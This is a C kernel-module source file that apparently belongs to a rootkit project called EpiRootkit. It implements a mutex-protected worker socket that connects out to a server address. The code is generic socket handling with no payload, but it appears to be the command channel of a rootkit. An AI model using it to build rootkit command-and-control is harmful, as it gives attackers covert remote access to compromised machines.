#include "network.h"

/*
 * worker_socket.c - Worker socket management for the EpiRootkit project.
 * This file provides API functions to manage a worker socket used for
 * communication with a server. It includes functions to get, set,
 * close, and connect the worker socket to a server address
 */

static struct socket *worker_socket = NULL;
static DEFINE_MUTEX(worker_socket_lock);

/*
 * get_worker_socket - Retrieves the worker socket.
 * Return: Pointer to the worker socket, or NULL if not set.
 */
struct socket *get_worker_socket(void) {
    struct socket *s;
    mutex_lock(&worker_socket_lock);
    s = worker_socket;
    mutex_unlock(&worker_socket_lock);
    return s;
}

/**
 * set_worker_socket - Sets the worker socket.
 * @param s: The socket to set as the worker socket.
 * Return: Pointer to the newly set worker socket.
 */
struct socket *set_worker_socket(struct socket *s) {
    mutex_lock(&worker_socket_lock);
    if (worker_socket)
        sock_release(worker_socket);
    worker_socket = s;
    mutex_unlock(&worker_socket_lock);
    return worker_socket;
}

/**
 * close_worker_socket - Closes the worker socket.
 * Return: 0 on success, or an error code on failure.
 */
int close_worker_socket(void) {
    mutex_lock(&worker_socket_lock);
    if (worker_socket) {
        sock_release(worker_socket);
        worker_socket = NULL;
        DBG_MSG("close_worker_socket: socket released\n");
    }
    mutex_unlock(&worker_socket_lock);
    return SUCCESS;
}

/**
 * connect_worker_socket_to_server - Connects the worker socket to the server.
 * @param addr: The server address to connect to.
 * Return: 0 on success, or a negative error code on failure.
 */
int connect_worker_socket_to_server(struct sockaddr_in *addr) {
    int ret;
    struct socket *s;

    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &s);
    if (ret < 0) {
        ERR_MSG("connect_worker_socket: failed to create socket (ret=%d)\n", ret);
        return ret;
    }

    ret = kernel_connect(s, (struct sockaddr *)addr, sizeof(*addr), 0);
    if (ret < 0) {
        ERR_MSG("connect_worker_socket: connection failed (ret=%d)\n", ret);
        sock_release(s);
        return ret;
    }

    set_worker_socket(s);
    DBG_MSG("connect_worker_socket: connection successful\n");
    return SUCCESS;
}
